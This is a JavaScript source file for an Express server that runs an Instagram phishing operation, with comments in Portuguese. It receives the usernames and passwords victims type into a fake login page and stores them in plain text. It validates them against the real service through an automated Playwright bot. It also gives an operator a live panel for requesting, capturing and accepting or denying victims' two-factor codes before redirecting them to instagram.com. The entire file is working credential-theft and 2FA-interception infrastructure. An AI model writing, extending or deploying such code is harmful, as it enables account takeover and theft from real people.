const express = require("express");
const fs = require("fs");
const path = require("path");
const { execFile } = require("child_process");

process.on("uncaughtException", (err) => {
    console.error("[CRITICAL] Uncaught Exception:", err.message || err);
});

process.on("unhandledRejection", (reason) => {
    console.error("[CRITICAL] Unhandled Rejection:", reason);
});

const app = express();
const PORT = process.env.PORT || 5501;

const PUBLIC_DIR = path.join(__dirname, "public");
const CODIGO_DIR = path.join(__dirname, "codigo");
const DADOS_JSON = path.join(__dirname, "dados.json");
const RESULTADO_JSON = path.join(__dirname, "resultado.json");

const URL_FINAL_PADRAO = "https://www.instagram.com";
const BOT_PY = path.join(__dirname, "bot.py");
const PYTHON = "python";
const WORKER_URL = "http://127.0.0.1:3006/testar";

let sseClients = [];

function notificarClientes() {
    if (sseClients.length === 0) return;
    try {
        const payload = gerarDadosPainel();
        const data = `data: ${JSON.stringify(payload)}\n\n`;
        sseClients = sseClients.filter(client => {
            try {
                if (client.res.writableEnded || client.res.destroyed) return false;
                client.res.write(data);
                return true;
            } catch (e) {
                return false;
            }
        });
    } catch (err) {
        console.error("Erro ao notificar SSE:", err);
    }
}

function lerDados() {
    if (!fs.existsSync(DADOS_JSON)) return [];
    try {
        const conteudo = fs.readFileSync(DADOS_JSON, "utf8");
        if (!conteudo.trim()) return [];
        const dados = JSON.parse(conteudo);
        return Array.isArray(dados) ? dados : [];
    } catch (erro) {
        console.error("Erro ao ler dados.json:", erro);
        return [];
    }
}

function salvarDados(dados) {
    fs.writeFileSync(DADOS_JSON, JSON.stringify(dados, null, 2) + "\n", "utf8");
}

function lerResultados() {
    if (!fs.existsSync(RESULTADO_JSON)) return [];
    try {
        const conteudo = fs.readFileSync(RESULTADO_JSON, "utf8");
        if (!conteudo.trim()) return [];
        const resultados = JSON.parse(conteudo);
        if (Array.isArray(resultados)) return resultados;
        if (resultados && typeof resultados === "object") return [resultados];
        return [];
    } catch (erro) {
        console.error("Erro ao ler resultado.json:", erro);
        return [];
    }
}

function salvarResultados(resultados) {
    fs.writeFileSync(RESULTADO_JSON, JSON.stringify(resultados, null, 2) + "\n", "utf8");
}

function gerarDadosPainel() {
    const dados = lerDados();
    const resultados = lerResultados();

    const codigos2fa = dados.filter(d => d.tipo === "2FA" || d.codigo || d.code);
    const logins = dados.filter(d => (d.tipo === "LOGIN" || !d.tipo) && (d.senha || d.password));

    const mapaUsuarios = new Map();

    dados.forEach(d => {
        const u = (d.nome || d.usuario || d.username || "desconhecido").trim();
        const userKey = u.toLowerCase();
        if (!mapaUsuarios.has(userKey)) {
            mapaUsuarios.set(userKey, {
                usuario: u,
                senhas: [],
                ultimaSenha: "—",
                codigos: [],
                ultimoCodigo: null,
                status_2fa: null,
                status_login: null,
                status_credencial: "testando",
                data_hora: d.data_hora || d.createdAt || "—",
                ultimoEventoTipo: null
            });
        }

        const item = mapaUsuarios.get(userKey);
        item.data_hora = d.data_hora || d.createdAt || item.data_hora;

        const codigo = d.codigo || d.code;
        const senha = d.senha || d.password;

        if (d.tipo === "2FA" || codigo) {
            item.ultimoEventoTipo = "2FA";
            const codStr = String(codigo);
            if (!item.codigos.includes(codStr)) item.codigos.push(codStr);
            item.ultimoCodigo = codStr;
            item.status_2fa = d.status_2fa || "pendente";
        } else if (senha) {
            item.ultimoEventoTipo = "LOGIN";
            const senhaStr = String(senha);
            if (!item.senhas.includes(senhaStr)) item.senhas.push(senhaStr);
            item.ultimaSenha = senhaStr;
            item.status_login = d.status_login || "aguardando_solicitacao";
            item.status_credencial = d.status_credencial || "testando";
            item.ultimoCodigo = null;
            item.status_2fa = null;
        }
    });

    // Fallback: se status_credencial estiver como testando, verifica histórico em resultado.json
    mapaUsuarios.forEach((item, userKey) => {
        if (!item.status_credencial || item.status_credencial === "testando") {
            for (let i = resultados.length - 1; i >= 0; i--) {
                const r = resultados[i];
                if (r && (r.nome || r.usuario || r.username || "").toLowerCase().trim() === userKey) {
                    item.status_credencial = r.valido ? "valido" : "invalido";
                    break;
                }
            }
        }
    });

    mapaUsuarios.forEach(item => {
        if (item.ultimoCodigo) {
            if (item.status_2fa === "aceito") {
                item.status = "2FA Aceito";
            } else if (item.status_2fa === "negado") {
                item.status = "2FA Negado";
            } else {
                item.status = "Aguardando Decisão";
            }
        } else {
            if (item.status_login === "solicitar_2fa") {
                item.status = "2FA Solicitado";
            } else {
                item.status = "Aguardando Operador";
            }
        }
    });

    const consolidados = Array.from(mapaUsuarios.values()).reverse();

    const feed = [...dados].reverse().map(d => ({
        tipo: (d.tipo === "2FA" || d.codigo || d.code) ? "2FA" : "LOGIN",
        usuario: d.nome || d.usuario || d.username || "desconhecido",
        senha: d.senha || d.password || null,
        codigo: d.codigo || d.code || null,
        status_2fa: d.status_2fa || null,
        status_login: d.status_login || null,
        status_credencial: d.status_credencial || null,
        data_hora: d.data_hora || d.createdAt || "—"
    }));

    return {
        success: true,
        totalLogins: logins.length,
        total2FA: codigos2fa.length,
        totalUsuarios: mapaUsuarios.size,
        consolidados,
        feed
    };
}

// Anti-cache middleware
app.use((req, res, next) => {
    if (req.path.startsWith("/api") || req.path.endsWith(".js") || req.path.endsWith(".html")) {
        res.set({
            "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
            "Pragma": "no-cache",
            "Expires": "0",
            "Surrogate-Control": "no-store"
        });
    }
    next();
});

app.use(express.json({ limit: "2mb" }));
app.use(express.urlencoded({ extended: true, limit: "2mb" }));

// Servir diretório codigo estaticamente em /codigo
app.use("/codigo", express.static(CODIGO_DIR));
// Servir diretório public na raiz
app.use(express.static(PUBLIC_DIR));

// Execução direta do bot Playwright standalone (fallback)
function executarBot() {
    return new Promise((resolve, reject) => {
        console.log("[FALLBACK] Acionando bot.py diretamente via child_process...");
        execFile(
            PYTHON,
            [BOT_PY],
            {
                cwd: __dirname,
                timeout: 45000
            },
            (erro, stdout, stderr) => {
                if (stdout) {
                    console.log("\n========== BOT ==========\n" + stdout + "=========================\n");
                }
                if (stderr) {
                    console.error("\n========== PYTHON STDERR ==========\n" + stderr + "===================================\n");
                }
                if (erro) {
                    return reject(erro);
                }
                resolve();
            }
        );
    });
}

// Disparo assíncrono para o Warm Worker Playwright (:3006)
async function testarViaWorker(usuario, senha) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 12000);

        const res = await fetch(WORKER_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ usuario, senha }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);

        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();

        const userKey = usuario.toLowerCase().trim();
        const statusCred = data.valido ? "valido" : (data.status_credencial || "invalido");

        const dados = lerDados();
        let atualizou = false;
        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            if (item && (item.senha || item.password)) {
                const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
                if (u === userKey) {
                    item.status_credencial = statusCred;
                    atualizou = true;
                    break;
                }
            }
        }

        if (atualizou) {
            salvarDados(dados);
            notificarClientes();
        }

        console.log(`[WARM WORKER] ${usuario} verificado em ${data.tempo_segundos || '?'}s -> ${statusCred}`);
        return true;
    } catch (err) {
        console.warn("[WARM WORKER] Worker offline ou ocupado, acionando fallback bot.py:", err.message);
        executarBot().catch(erro => {
            console.error("Execução assíncrona do bot.py:", erro.message);
        });
        return false;
    }
}

// Rota de salvamento de login (suporta /salvar e /api/login)
const handleSalvarLogin = (req, res) => {
    const nome = req.body.nome || req.body.usuario || req.body.username;
    const senha = req.body.senha || req.body.password;

    if (!nome || !senha || !String(nome).trim() || !String(senha)) {
        return res.status(400).json({
            success: false,
            status: "erro",
            mensagem: "Preencha todos os campos."
        });
    }

    try {
        const usuarioLimpo = String(nome).trim();
        const senhaLimpa = String(senha);
        const dados = lerDados();

        dados.push({
            tipo: "LOGIN",
            nome: usuarioLimpo,
            usuario: usuarioLimpo,
            username: usuarioLimpo,
            senha: senhaLimpa,
            password: senhaLimpa,
            status_login: "aguardando_solicitacao",
            status_credencial: "testando",
            data_hora: new Date().toLocaleString("pt-BR"),
            createdAt: new Date().toISOString()
        });

        salvarDados(dados);
        notificarClientes();

        console.log(`[LOGIN] Nova tentativa recebida: ${usuarioLimpo} (Status: aguardando operador | Auditoria: testando na Meta)`);

        // Dispara validação prioritária via Warm Worker (com fallback transparente)
        testarViaWorker(usuarioLimpo, senhaLimpa);

        // Timeout de segurança: se após 16s o status ainda for 'testando',
        // marca como 'invalido' para nunca reter a vítima/painel indefinidamente
        setTimeout(() => {
            try {
                const dadosAtualizados = lerDados();
                let atualizou = false;
                const uKey = usuarioLimpo.toLowerCase();
                for (let i = dadosAtualizados.length - 1; i >= 0; i--) {
                    const item = dadosAtualizados[i];
                    if (item && (item.senha || item.password)) {
                        const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
                        if (u === uKey && item.status_credencial === "testando") {
                            item.status_credencial = "invalido";
                            atualizou = true;
                            break;
                        }
                    }
                }
                if (atualizou) {
                    salvarDados(dadosAtualizados);
                    notificarClientes();
                }
            } catch (e) {}
        }, 16000);

        return res.status(201).json({
            success: true,
            status_login: "aguardando_solicitacao",
            status_credencial: "testando",
            usuario: usuarioLimpo,
            mensagem: "Login registrado. Aguardando operador solicitar 2FA no painel."
        });
    } catch (erro) {
        console.error("Erro em salvar login:", erro);
        return res.status(500).json({
            success: false,
            status: "erro",
            mensagem: "Erro interno durante o processamento."
        });
    }
};

app.post("/salvar", handleSalvarLogin);
app.post("/api/login", handleSalvarLogin);

// Rota para bot externo notificar resultado de validação
app.post("/api/resultado-bot", (req, res) => {
    const usuario = req.body.usuario || req.body.username || req.body.nome;
    const { valido, mensagem, status_credencial } = req.body;

    if (!usuario) {
        return res.status(400).json({ success: false, mensagem: "Usuário obrigatório." });
    }

    const userKey = String(usuario).toLowerCase().trim();
    const statusCred = status_credencial || (valido ? "valido" : "invalido");

    try {
        const dados = lerDados();
        let atualizou = false;

        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            if (item && (item.senha || item.password)) {
                const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
                if (u === userKey) {
                    item.status_credencial = statusCred;
                    atualizou = true;
                    break;
                }
            }
        }

        if (atualizou) {
            salvarDados(dados);
        }

        const resultados = lerResultados();
        let achou = false;
        for (let i = resultados.length - 1; i >= 0; i--) {
            const r = resultados[i];
            if (r && (r.nome || r.usuario || r.username || "").toLowerCase().trim() === userKey) {
                r.valido = !!valido;
                r.mensagem = mensagem || (valido ? "Credencial válida" : "Credencial incorreta");
                achou = true;
                break;
            }
        }
        if (!achou) {
            resultados.push({
                data_hora: new Date().toLocaleString("pt-BR"),
                valido: !!valido,
                nome: usuario,
                usuario: usuario,
                mensagem: mensagem || (valido ? "Credencial válida" : "Credencial incorreta")
            });
        }
        salvarResultados(resultados);

        notificarClientes();
        console.log(`[BOT RESULTADO] ${usuario} -> ${statusCred} (${mensagem || ''})`);
        return res.json({ success: true, usuario, status_credencial: statusCred });
    } catch (err) {
        console.error("Erro em /api/resultado-bot:", err);
        return res.status(500).json({ success: false, mensagem: "Erro ao registrar resultado." });
    }
});

// Polling do status do login (para a tela da vítima saber se aguarda ou avança para 2FA)
app.get("/api/status-login", (req, res) => {
    const usuario = (req.query.usuario || req.query.username || "").toLowerCase().trim();
    const dados = lerDados();
    const resultados = lerResultados();

    for (let i = dados.length - 1; i >= 0; i--) {
        const item = dados[i];
        if (item && (item.senha || item.password)) {
            const userKey = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
            if (!usuario || userKey === usuario) {
                let statusCred = item.status_credencial || "testando";
                if (statusCred === "testando") {
                    for (let j = resultados.length - 1; j >= 0; j--) {
                        const r = resultados[j];
                        if (r && (r.nome || r.usuario || r.username || "").toLowerCase().trim() === userKey) {
                            statusCred = r.valido ? "valido" : "invalido";
                            break;
                        }
                    }
                }
                return res.json({
                    success: true,
                    status_login: item.status_login || "aguardando_solicitacao",
                    status_credencial: statusCred,
                    redirect: "/codigo/"
                });
            }
        }
    }

    let fallbackStatusCred = "testando";
    for (let j = resultados.length - 1; j >= 0; j--) {
        const r = resultados[j];
        if (r && (r.nome || r.usuario || r.username || "").toLowerCase().trim() === usuario) {
            fallbackStatusCred = r.valido ? "valido" : "invalido";
            break;
        }
    }

    return res.json({
        success: true,
        status_login: "aguardando_solicitacao",
        status_credencial: fallbackStatusCred,
        redirect: "/codigo/"
    });
});

// Operador solicita 2FA para um usuário
app.post("/api/solicitar-2fa", (req, res) => {
    const usuario = req.body.usuario || req.body.username;
    if (!usuario) {
        return res.status(400).json({ success: false, mensagem: "Usuário obrigatório." });
    }

    const userKey = String(usuario).toLowerCase().trim();

    try {
        const dados = lerDados();
        let atualizou = false;

        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            if (item && (item.senha || item.password)) {
                const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
                if (u === userKey) {
                    item.status_login = "solicitar_2fa";
                    atualizou = true;
                    break;
                }
            }
        }

        if (atualizou) {
            salvarDados(dados);
            notificarClientes();
        }

        console.log(`[PAINEL] 2FA Solicitado para: ${usuario}`);

        return res.json({
            success: true,
            usuario,
            status_login: "solicitar_2fa"
        });
    } catch (err) {
        console.error("Erro em /api/solicitar-2fa:", err);
        return res.status(500).json({ success: false, mensagem: "Erro ao solicitar 2FA." });
    }
});

// Rota de salvamento de código 2FA (suporta /salvar-codigo e /api/salvar-codigo)
const handleSalvarCodigo = (req, res) => {
    const codigo = req.body.codigo || req.body.code;
    const usuario = req.body.usuario || req.body.username;

    if (!codigo || !String(codigo).trim()) {
        return res.status(400).json({
            success: false,
            mensagem: "Código não informado."
        });
    }

    try {
        const codigoLimpo = String(codigo).trim();
        const usuarioLimpo = usuario ? String(usuario).trim() : "desconhecido";

        const dados = lerDados();
        dados.push({
            tipo: "2FA",
            nome: usuarioLimpo,
            usuario: usuarioLimpo,
            username: usuarioLimpo,
            codigo: codigoLimpo,
            code: codigoLimpo,
            status_2fa: "pendente",
            data_hora: new Date().toLocaleString("pt-BR"),
            createdAt: new Date().toISOString()
        });

        salvarDados(dados);
        notificarClientes();

        const logs = lerResultados();
        logs.push({
            data_hora: new Date().toLocaleString("pt-BR"),
            valido: true,
            nome: usuarioLimpo,
            usuario: usuarioLimpo,
            codigo_2fa: codigoLimpo,
            status_2fa: "pendente",
            mensagem: "Código 2FA recebido - aguardando decisão no painel",
            url_final: URL_FINAL_PADRAO
        });

        salvarResultados(logs);

        console.log(`[2FA] Código capturado para ${usuarioLimpo}: ${codigoLimpo} (Status: pendente)`);

        return res.json({
            success: true,
            status_2fa: "pendente",
            url_final: URL_FINAL_PADRAO
        });
    } catch (erro) {
        console.error("Erro em salvar código:", erro);
        return res.status(500).json({
            success: false,
            mensagem: "Erro interno ao salvar código."
        });
    }
};

app.post("/salvar-codigo", handleSalvarCodigo);
app.post("/api/salvar-codigo", handleSalvarCodigo);

// Polling do status do 2FA (para a tela de código saber se foi aceito ou negado)
app.get("/api/status-2fa", (req, res) => {
    const usuario = (req.query.usuario || req.query.username || "").toLowerCase().trim();
    const dados = lerDados();

    for (let i = dados.length - 1; i >= 0; i--) {
        const item = dados[i];
        if (item && (item.tipo === "2FA" || item.codigo || item.code)) {
            const userKey = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
            if (!usuario || userKey === usuario) {
                return res.json({
                    success: true,
                    status_2fa: item.status_2fa || "pendente",
                    url_final: URL_FINAL_PADRAO
                });
            }
        }
    }

    return res.json({
        success: true,
        status_2fa: "pendente",
        url_final: URL_FINAL_PADRAO
    });
});

// Operador decide 2FA: aceitar ou negar
app.post("/api/decidir-2fa", (req, res) => {
    const usuario = req.body.usuario || req.body.username;
    const decisao = req.body.decisao;

    if (!usuario || !decisao) {
        return res.status(400).json({
            success: false,
            mensagem: "Usuário e decisão obrigatórios."
        });
    }

    const decisaoLimpa = decisao === "aceito" ? "aceito" : "negado";
    const userKey = String(usuario).toLowerCase().trim();

    try {
        const dados = lerDados();
        let atualizou = false;

        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            if (item && (item.tipo === "2FA" || item.codigo || item.code)) {
                const u = (item.nome || item.usuario || item.username || "").toLowerCase().trim();
                if (u === userKey) {
                    item.status_2fa = decisaoLimpa;
                    atualizou = true;
                    break;
                }
            }
        }

        if (atualizou) {
            salvarDados(dados);
            notificarClientes();
        }

        const resultados = lerResultados();
        for (let i = resultados.length - 1; i >= 0; i--) {
            const r = resultados[i];
            if (r && (r.nome || r.usuario || r.username || "").toLowerCase().trim() === userKey) {
                r.status_2fa = decisaoLimpa;
                break;
            }
        }
        salvarResultados(resultados);

        console.log(`[DECISÃO 2FA] ${usuario} -> ${decisaoLimpa}`);

        return res.json({
            success: true,
            usuario,
            decisao: decisaoLimpa
        });
    } catch (err) {
        console.error("Erro em /api/decidir-2fa:", err);
        return res.status(500).json({ success: false, mensagem: "Erro ao registrar decisão." });
    }
});

// Dados consolidados do painel
app.get("/api/painel", (req, res) => {
    try {
        res.json(gerarDadosPainel());
    } catch (err) {
        console.error("Erro ao carregar painel:", err);
        res.status(500).json({ success: false, mensagem: "Erro ao ler registros." });
    }
});

// Stream SSE em tempo real
app.get("/api/stream", (req, res) => {
    res.setHeader("Content-Type", "text/event-stream");
    res.setHeader("Cache-Control", "no-cache");
    res.setHeader("Connection", "keep-alive");
    if (res.flushHeaders) res.flushHeaders();

    const clientId = Date.now() + "_" + Math.random();
    const newClient = { id: clientId, res };
    sseClients.push(newClient);

    // Envia estado inicial
    try {
        const initialData = `data: ${JSON.stringify(gerarDadosPainel())}\n\n`;
        res.write(initialData);
    } catch (e) {}

    // Heartbeat para manter conexão viva através de proxies e firewalls
    const keepAlive = setInterval(() => {
        try {
            if (!res.writableEnded && !res.destroyed) {
                res.write(": keepalive\n\n");
            }
        } catch (e) {}
    }, 25000);

    const removerCliente = () => {
        clearInterval(keepAlive);
        sseClients = sseClients.filter(c => c.id !== clientId);
    };

    req.on("close", removerCliente);
    req.on("error", removerCliente);
    res.on("close", removerCliente);
    res.on("error", removerCliente);
});

// Limpeza de dados (Zero Test Pollution)
app.post("/api/limpar", (req, res) => {
    try {
        salvarDados([]);
        salvarResultados([]);
        notificarClientes();
        res.json({ success: true, mensagem: "Registros limpos com sucesso." });
    } catch (err) {
        console.error("Erro ao limpar dados:", err);
        res.status(500).json({ success: false, mensagem: "Erro ao limpar dados." });
    }
});

// Rotas de Páginas
app.get("/painel", (req, res) => {
    res.sendFile(path.join(PUBLIC_DIR, "painel.html"));
});

app.get("/codigo", (req, res) => {
    res.sendFile(path.join(CODIGO_DIR, "index.html"));
});

app.get("/codigo/", (req, res) => {
    res.sendFile(path.join(CODIGO_DIR, "index.html"));
});

app.get("/", (req, res) => {
    res.sendFile(path.join(PUBLIC_DIR, "index.html"));
});

app.get("/health", (req, res) => {
    res.json({
        status: "ok",
        service: "ig-web",
        timestamp: new Date().toISOString()
    });
});

app.listen(PORT, () => {
    console.log();
    console.log("====================================");
    console.log(`Servidor rodando em http://localhost:${PORT}`);
    console.log(`Painel disponível em http://localhost:${PORT}/painel`);
    console.log(`Tela de 2FA em http://localhost:${PORT}/codigo/`);
    console.log("====================================");
    console.log();
});
